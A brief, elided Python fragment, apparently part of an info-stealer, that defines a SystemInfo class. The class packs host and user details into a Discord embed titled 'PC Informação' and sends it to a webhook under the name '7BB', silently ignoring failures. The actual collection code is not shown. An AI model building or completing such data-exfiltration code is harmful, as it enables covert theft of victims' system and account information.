...
class SystemInfo():
    def __init__(self, webhook: str) -> None:
        ...
        embed = Embed(title="PC Informação", color=0x000000)
        ...
        try:
            webhook.send(
                ...
                username="7BB",
                avatar_url="https://imgur.com/a/aAIfxUb"
            )
        except:
            pass
    ...
    def user_data(self) -> tuple[str, str, bool]:
        ...
        return (
            "<:red_ninja:967360512499261510> User",
